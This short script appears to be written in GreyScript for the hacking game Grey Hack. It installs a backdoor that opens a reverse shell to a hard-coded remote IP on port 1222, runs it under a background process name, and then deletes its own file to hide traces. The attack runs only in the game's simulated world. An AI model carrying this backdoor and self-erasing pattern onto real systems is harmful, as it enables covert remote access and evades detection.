if params.len != 1 or params[0] != #envar ZSH_PASS then exit 

RSHELL_SERVER = "1.24.143.147"

metax = include_lib("/lib/metaxploit.so")
if not metax then metax = include_lib(current_path + "metaxploit.so")
if not metax then exit("No metaxploit.so found.")

rshell_client(metax, RSHELL_SERVER, 1222, "bgprocess")
print("Backdoor installed.")
get_shell.host_computer.File(program_path).delete